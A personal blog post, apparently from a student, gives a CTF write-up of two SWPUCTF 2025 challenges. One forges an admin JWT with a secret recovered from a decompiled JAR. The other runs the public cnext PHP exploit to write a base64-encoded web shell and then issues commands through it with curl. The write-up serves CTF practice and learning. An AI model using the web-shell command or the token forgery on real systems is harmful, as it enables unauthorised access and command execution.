@@ -1,0 +1,368 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>CTF-SWPUCTF2025秋季新生赛1 | SereniusX的博客</title><meta name="author" content="SereniusX"><meta name="copyright" content="SereniusX"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="题目来源：NSSCTF 练习时间：2026年1月31日 练习数量：2 ⭐️ 01 [SWPUCTF 2025 秋季新生赛]”j”wt🚩flag：NSSCTF{18a9770a-1881-4d6c-bc97-10cef8f39967} 💡hint：java jwt JAR反编译 JAVA审计 JWT伪造 🔧tool：jadx-gui www.jwt.io burpsuite JWT（JSON">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CTF-SWPUCTF2025秋季新生赛1">
+<meta property="og:url" content="https://sereniusx.github.io/2026/01/31/CTF-SWPUCTF2025%E7%A7%8B%E5%AD%A3%E6%96%B0%E7%94%9F%E8%B5%9B1/index.html">
+<meta property="og:site_name" content="SereniusX的博客">
+<meta property="og:description" content="题目来源：NSSCTF 练习时间：2026年1月31日 练习数量：2 ⭐️ 01 [SWPUCTF 2025 秋季新生赛]”j”wt🚩flag：NSSCTF{18a9770a-1881-4d6c-bc97-10cef8f39967} 💡hint：java jwt JAR反编译 JAVA审计 JWT伪造 🔧tool：jadx-gui www.jwt.io burpsuite JWT（JSON">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://sereniusx.github.io/img/avatar2.jpg">
+<meta property="article:published_time" content="2026-01-31T11:43:42.000Z">
+<meta property="article:modified_time" content="2026-01-31T15:37:55.350Z">
+<meta property="article:author" content="SereniusX">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://sereniusx.github.io/img/avatar2.jpg"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "CTF-SWPUCTF2025秋季新生赛1",
+  "url": "https://sereniusx.github.io/2026/01/31/CTF-SWPUCTF2025%E7%A7%8B%E5%AD%A3%E6%96%B0%E7%94%9F%E8%B5%9B1/",
+  "image": "https://sereniusx.github.io/img/avatar2.jpg",
+  "datePublished": "2026-01-31T11:43:42.000Z",
+  "dateModified": "2026-01-31T15:37:55.350Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "SereniusX",
+      "url": "https://sereniusx.github.io/"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/avatar2.png"><link rel="canonical" href="https://sereniusx.github.io/2026/01/31/CTF-SWPUCTF2025%E7%A7%8B%E5%AD%A3%E6%96%B0%E7%94%9F%E8%B5%9B1/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', 'undefined')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', 'undefined')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"未找到符合您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'CTF-SWPUCTF2025秋季新生赛1',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><link rel="stylesheet" href="/css/shuoshuo.css"><link rel="stylesheet" href="/css/gpt-article.css"><link rel="stylesheet" href="/css/custom.css"><link rel="stylesheet" href="/css/heatmap.css"><meta name="generator" content="Hexo 7.3.0">
+<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
+</head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/avatar2.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">16</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">9</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">8</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fa fa-graduation-cap"></i><span> 博文</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li><li><a class="site-page child" href="/heatmap/"><i class="fa-fw fa fa-fire"></i><span> 热力图</span></a></li><li><a class="site-page child" href="/writer/"><i class="fa-fw fa fa-print"></i><span> 编辑器</span></a></li></ul></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-list"></i><span> 生活</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/shuoshuos/"><i class="fa-fw fa fa-heart"></i><span> 说说</span></a></li><li><a class="site-page child" href="/photos/"><i class="fa-fw fa fa-camera-retro"></i><span> 相册</span></a></li><li><a class="site-page child" href="/music/"><i class="fa-fw fa fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/books/"><i class="fa-fw fas fa-book"></i><span> 书单</span></a></li><li><a class="site-page child" href="/useful/"><i class="fa-fw fas fa-tags"></i><span> 常用</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/mylink/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于笔者</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="not-top-img" id="page-header"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">SereniusX的博客</span></a><a class="nav-page-title" href="/"><span class="site-name">CTF-SWPUCTF2025秋季新生赛1</span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></span></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fa fa-graduation-cap"></i><span> 博文</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li><li><a class="site-page child" href="/heatmap/"><i class="fa-fw fa fa-fire"></i><span> 热力图</span></a></li><li><a class="site-page child" href="/writer/"><i class="fa-fw fa fa-print"></i><span> 编辑器</span></a></li></ul></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-list"></i><span> 生活</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/shuoshuos/"><i class="fa-fw fa fa-heart"></i><span> 说说</span></a></li><li><a class="site-page child" href="/photos/"><i class="fa-fw fa fa-camera-retro"></i><span> 相册</span></a></li><li><a class="site-page child" href="/music/"><i class="fa-fw fa fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/books/"><i class="fa-fw fas fa-book"></i><span> 书单</span></a></li><li><a class="site-page child" href="/useful/"><i class="fa-fw fas fa-tags"></i><span> 常用</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/mylink/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于笔者</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav></header><main class="layout" id="content-inner"><div id="post"><div id="post-info"><h1 class="post-title">CTF-SWPUCTF2025秋季新生赛1</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2026-01-31T11:43:42.000Z" title="发表于 2026-01-31 19:43:42">2026-01-31</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2026-01-31T15:37:55.350Z" title="更新于 2026-01-31 23:37:55">2026-01-31</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF/">CTF</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div><article class="container post-content" id="article-container"><p><em>题目来源：NSSCTF</em></p>
+<p><em>练习时间：2026年1月31日</em></p>
+<p><em>练习数量：2</em></p>
+<h2 id="⭐️-01-SWPUCTF-2025-秋季新生赛-”j”wt"><a href="#⭐️-01-SWPUCTF-2025-秋季新生赛-”j”wt" class="headerlink" title="⭐️ 01 [SWPUCTF 2025 秋季新生赛]”j”wt"></a>⭐️ 01 [SWPUCTF 2025 秋季新生赛]”j”wt</h2><p>🚩flag：<code>NSSCTF{18a9770a-1881-4d6c-bc97-10cef8f39967}</code></p>
+<p>💡hint：<code>java</code> <code>jwt</code> <code>JAR反编译</code> <code>JAVA审计</code> <code>JWT伪造</code></p>
+<p>🔧tool：<code>jadx-gui</code> <code>www.jwt.io</code> <code>burpsuite</code></p>
+<p>JWT（JSON Web Token）是一种<br>👉 把“你是谁 + 是否已登录”这些信息，打包成一个字符串，在前后端之间安全传来传去的方式。<br>结构：Header.Payload.Signature</p>
+<p>工具启动：</p>
+<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">jadx-gui</span><br></pre></td></tr></tbody></table></figure>
+
+<p>由下面两段代码得出username和password：</p>
+<figure class="highlight java"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">@PostMapping({"/login"})</span></span><br><span class="line">    <span class="keyword">public</span> ResponseEntity&lt;String&gt; <span class="title function_">login</span><span class="params">(<span class="meta">@RequestBody</span> LoginRequest request)</span> {</span><br><span class="line">        System.out.println(<span class="string">"Login attempt: "</span> + request.getUsername());</span><br><span class="line">        <span class="keyword">if</span> (isValidUser(request.getUsername(), request.getPassword())) {</span><br><span class="line">            <span class="type">String</span> <span class="variable">token</span> <span class="operator">=</span> Jwts.builder().setSubject(request.getUsername()).claim(<span class="string">"role"</span>, ClassicConstants.USER_MDC_KEY).setIssuedAt(<span class="keyword">new</span> <span class="title class_">Date</span>()).setExpiration(<span class="keyword">new</span> <span class="title class_">Date</span>(System.currentTimeMillis() + CoreConstants.MILLIS_IN_ONE_HOUR)).signWith(SECRET_KEY).compact();</span><br><span class="line">            System.out.println(<span class="string">"Generated token for "</span> + request.getUsername() + <span class="string">" (role: user): "</span> + token);</span><br><span class="line">            <span class="keyword">return</span> ResponseEntity.ok(token);</span><br><span class="line">        }</span><br><span class="line">        System.out.println(<span class="string">"Login failed for: "</span> + request.getUsername());</span><br><span class="line">        <span class="keyword">return</span> ResponseEntity.status(<span class="number">401</span>).body(<span class="string">"Login failed: Invalid credentials"</span>);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="type">boolean</span> <span class="title function_">isValidUser</span><span class="params">(String username, String password)</span> {</span><br><span class="line">        <span class="keyword">return</span> ClassicConstants.USER_MDC_KEY.equals(username) &amp;&amp; <span class="string">"Ns3.P@s3w0rd"</span>.equals(password);</span><br><span class="line">    }</span><br></pre></td></tr></tbody></table></figure>
+<p>得到用户名和密码：</p>
+<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">{<span class="string">"username"</span>:<span class="string">"user"</span>,<span class="string">"password"</span>:<span class="string">"Ns3.P@s3w0rd"</span>}</span><br></pre></td></tr></tbody></table></figure>
+<p>注意抓包。<br>返回值就是 JWT 字符串。</p>
+<p>对称密钥硬编码，可直接伪造 admin</p>
+<p>源码里：</p>
+<figure class="highlight java"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">SECRET_STRING</span> <span class="operator">=</span> <span class="string">"supersecretkeythatis32byteslong123!"</span>;</span><br><span class="line">SECRET_KEY = Keys.hmacShaKeyFor(keyBytes);</span><br></pre></td></tr></tbody></table></figure>
+
+<p>解析时也是：</p>
+<figure class="highlight java"><table><tbody><tr><td class="code"><pre><span class="line">Jwts.parserBuilder().setSigningKey(SECRET_KEY).build().parseClaimsJws(token)</span><br></pre></td></tr></tbody></table></figure>
+
+<p>这意味着：<strong>只要你用同样的 secret 用 HS256 重新签名，服务端就会相信。</strong></p>
+<p>伪造思路：把 payload 的 role 改成 admin</p>
+<p><code>/profile</code> 里：</p>
+<figure class="highlight java"><table><tbody><tr><td class="code"><pre><span class="line"><span class="type">Object</span> <span class="variable">role</span> <span class="operator">=</span> (String) claims.get(<span class="string">"role"</span>);</span><br><span class="line">...</span><br><span class="line"><span class="keyword">if</span> (<span class="string">"admin"</span>.equals(role)) {</span><br><span class="line">  profile.put(<span class="string">"flag"</span>, getFlag());</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+
+<p>使用工具：<a target="_blank" rel="noopener" href="https://www.jwt.io/">https://www.jwt.io/</a><br>进行JWT的解析和生成</p>
+<p>将原来的抓包：</p>
+<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">GET /profile HTTP/1.1</span><br><span class="line">Host: node1.anna.nssctf.cn:25946</span><br><span class="line">Accept-Language: zh-CN</span><br><span class="line">Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ1c2VyIiwicm9sZSI6InVzZXIiLCJpYXQiOjE3Njk4NjUwNDMsImV4cCI6MTc2OTg2ODY0M30.dWTGzjxvO1UmFg77uODq_KLbNRu9NEbc6x3FDI1V1VM</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.6533.100 Safari/537.36</span><br><span class="line">Accept: */*</span><br><span class="line">Referer: http://node1.anna.nssctf.cn:25946/profile.html</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Connection: keep-alive</span><br></pre></td></tr></tbody></table></figure>
+<p>当中的JWT修改为（注意要用到上面的secret string)：</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ1c2VyIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNzY5ODY1MDQzLCJleHAiOjE3Njk4Njg2NDN9.pobCyK-xZOaffUZIAP29DfQGEI5kYT00RAtWPv-fXfY</span><br></pre></td></tr></tbody></table></figure>
+<p>然后就能在页面中拿到flag。</p>
+<p><img src="https://a1.boltp.com/2026/01/31/697e038a98787.png" alt="flag图片："></p>
+<hr>
+<h2 id="⭐️-02-SWPUCTF-2025-秋季新生赛-我是签到"><a href="#⭐️-02-SWPUCTF-2025-秋季新生赛-我是签到" class="headerlink" title="⭐️ 02 [SWPUCTF 2025 秋季新生赛]我是签到"></a>⭐️ 02 [SWPUCTF 2025 秋季新生赛]我是签到</h2><p>🚩flag：<code>NSSCTF{9d42f763-63c8-40d6-a4bb-31f0a37393fd}</code></p>
+<p>💡hint：<code>WEB</code> </p>
+<p>🔧tool：<code>jadx-gui</code> <code>www.jwt.io</code> <code>burpsuite</code></p>
+<p>题目描述：</p>
+<figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>   </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">'file'</span>])){ </span><br><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_POST</span>[<span class="string">'file'</span>]);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"File contents: <span class="subst">$data</span>"</span>;}</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></tbody></table></figure>
+
+<p>攻击脚本：<a target="_blank" rel="noopener" href="https://github.com/ambionics/cnext-exploits/blob/main/cnext-exploit.py">https://github.com/ambionics/cnext-exploits/blob/main/cnext-exploit.py</a></p>
+<p>后面弄了一个ubuntu的docker环境在上面做出来的。</p>
+<p>太不容易了。做了三个多小时才出来。exploit成功之后拿flag又折腾了一下。还是太不熟练了</p>
+<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">python3 cnext-exploit.py \</span><br><span class="line">  http://node1.anna.nssctf.cn:27059/ \</span><br><span class="line">  <span class="string">"echo PD9waHAgcGFzc3RocnUoJF9QT1NUWydjbWQnXSk7ID8+ | base64 -d &gt; /var/www/html/1.php"</span></span><br></pre></td></tr></tbody></table></figure>
+<p><img src="https://a1.boltp.com/2026/01/31/697e2076bd9e0.png" alt="攻击图1"></p>
+<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">curl -X POST \</span><br><span class="line">  -d <span class="string">'cmd=env'</span> \</span><br><span class="line">  http://node1.anna.nssctf.cn:27059/1.php</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
+<p><img src="https://a1.boltp.com/2026/01/31/697e205bd05d8.png" alt="获得flag"></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://sereniusx.github.io">SereniusX</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://sereniusx.github.io/2026/01/31/CTF-SWPUCTF2025%E7%A7%8B%E5%AD%A3%E6%96%B0%E7%94%9F%E8%B5%9B1/">https://sereniusx.github.io/2026/01/31/CTF-SWPUCTF2025%E7%A7%8B%E5%AD%A3%E6%96%B0%E7%94%9F%E8%B5%9B1/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://sereniusx.github.io" target="_blank">SereniusX的博客</a>！</span></div></div><div class="tag_share"><div class="post-share"><div class="social-share" data-image="/img/avatar2.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related full-width" href="/2026/01/31/CTF-Web%E6%9A%91%E6%9C%9F%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/" title="CTF-Web暑期刷题记录"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">CTF-Web暑期刷题记录</div></div><div class="info-2"><div class="info-item-1">以下题目来源：ctfshow web (ﾉ◕ヮ◕)ﾉ*:･ﾟ✧🌟⭐🌠 01 web签到题🚩 flag：ctfshow{cbb55ba5-575a-4f44-8eaa-666c079fe370} 打开环境，使用开发者模式，观察发现有注释，注释的文本放到cyberchef中进行base64解码得到flag。 02 web2🚩 flag：ctfsho...</div></div></div></a></nav><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div id="giscus-wrap"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/avatar2.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">SereniusX</div><div class="author-info-description"></div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">16</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">9</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">8</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/sereniusx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%AD%90%EF%B8%8F-01-SWPUCTF-2025-%E7%A7%8B%E5%AD%A3%E6%96%B0%E7%94%9F%E8%B5%9B-%E2%80%9Dj%E2%80%9Dwt"><span class="toc-text">⭐️ 01 [SWPUCTF 2025 秋季新生赛]”j”wt</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%AD%90%EF%B8%8F-02-SWPUCTF-2025-%E7%A7%8B%E5%AD%A3%E6%96%B0%E7%94%9F%E8%B5%9B-%E6%88%91%E6%98%AF%E7%AD%BE%E5%88%B0"><span class="toc-text">⭐️ 02 [SWPUCTF 2025 秋季新生赛]我是签到</span></a></li></ol></div></div><div class="card-widget card-post-series"><div class="item-headline"><i class="fa-solid fa-layer-group"></i><span>CTF刷题记录</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/01/31/CTF-Web%E6%9A%91%E6%9C%9F%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/" title="CTF-Web暑期刷题记录">CTF-Web暑期刷题记录</a><time datetime="2026-01-31T08:52:12.000Z" title="发表于 2026-01-31 16:52:12">2026-01-31</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/01/31/CTF-SWPUCTF2025%E7%A7%8B%E5%AD%A3%E6%96%B0%E7%94%9F%E8%B5%9B1/" title="CTF-SWPUCTF2025秋季新生赛1">CTF-SWPUCTF2025秋季新生赛1</a><time datetime="2026-01-31T11:43:42.000Z" title="发表于 2026-01-31 19:43:42">2026-01-31</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/01/31/CTF-Reverse%E6%9A%91%E6%9C%9F%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/" title="CTF-Reverse暑期刷题记录">CTF-Reverse暑期刷题记录</a><time datetime="2026-01-31T04:49:14.000Z" title="发表于 2026-01-31 12:49:14">2026-01-31</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/01/30/CTFshowPWN%E7%BB%83%E4%B9%A0/" title="CTF-PWN暑期刷题记录">CTF-PWN暑期刷题记录</a><time datetime="2026-01-30T13:02:12.000Z" title="发表于 2026-01-30 21:02:12">2026-01-30</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/01/31/CTF-Crypto%E6%9A%91%E6%9C%9F%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/" title="CTF-Crypto暑期刷题记录">CTF-Crypto暑期刷题记录</a><time datetime="2026-01-31T08:43:54.000Z" title="发表于 2026-01-31 16:43:54">2026-01-31</time></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;2025 - 2026 By SereniusX</span><span class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 7.3.0</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.4.0-b2</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="chat-btn" type="button" title="聊天" style="display:none"><i class="fas fa-message"></i></button><a id="to_comment" href="#post-comment" title="前往评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"><script>(() => {
+  const runMermaid = ele => {
+    window.loadMermaid = true
+    const theme = document.documentElement.getAttribute('data-theme') === 'dark' ? 'dark' : 'default'
+
+    ele.forEach((item, index) => {
+      const mermaidSrc = item.firstElementChild
+      const mermaidThemeConfig = `%%{init:{ 'theme':'${theme}'}}%%\n`
+      const mermaidID = `mermaid-${index}`
+      const mermaidDefinition = mermaidThemeConfig + mermaidSrc.textContent
+
+      const renderFn = mermaid.render(mermaidID, mermaidDefinition)
+      const renderMermaid = svg => {
